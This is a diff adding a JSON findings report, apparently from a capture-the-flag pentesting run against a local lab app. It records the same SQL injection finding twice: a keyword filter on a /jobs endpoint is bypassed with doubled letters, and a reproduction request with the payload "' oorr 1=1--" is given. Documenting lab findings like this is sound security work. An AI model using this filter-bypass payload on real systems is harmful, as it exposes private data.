@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T20:58:06.510952+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "ca385a2d-2468-4be2-9ee6-6d063a11af49",
+      "timestamp": "2026-04-14T20:58:06.510841+00:00",
+      "title": "SQL Injection via Allowlist Bypass - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48467/jobs",
+      "description": "The /jobs POST endpoint is vulnerable to SQL injection. An allowlist filter blocks common SQL keywords like 'OR', 'UNION', 'SELECT', but can be bypassed using double-letter obfuscation (e.g., 'oorr' instead of 'or'). The injection allows bypassing the job_type filter to retrieve all records including private/admin-only jobs.",
+      "evidence": "flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /jobs\nContent-Type: application/json\n\n{\"job_type\": \"' oorr 1=1--\"}",
+        "expected": "Returns all jobs including private ones with the flag in the description field"
+      }
+    },
+    {
+      "id": "5fbf3d8c-593d-4566-aa10-87c63500121c",
+      "timestamp": "2026-04-14T20:58:06.528217+00:00",
+      "title": "SQL Injection via Allowlist Bypass - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48467/jobs",
+      "description": "The /jobs POST endpoint is vulnerable to SQL injection. An allowlist filter blocks common SQL keywords like 'OR', 'UNION', 'SELECT', but can be bypassed using double-letter obfuscation (e.g., 'oorr' instead of 'or'). The injection allows bypassing the job_type filter to retrieve all records including private/admin-only jobs.",
+      "evidence": "flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /jobs\nContent-Type: application/json\n\n{\"job_type\": \"' oorr 1=1--\"}",
+        "expected": "Returns all jobs including private ones with the flag in the description field"
+      }
+    }
+  ],
+  "diagrams": []
+}
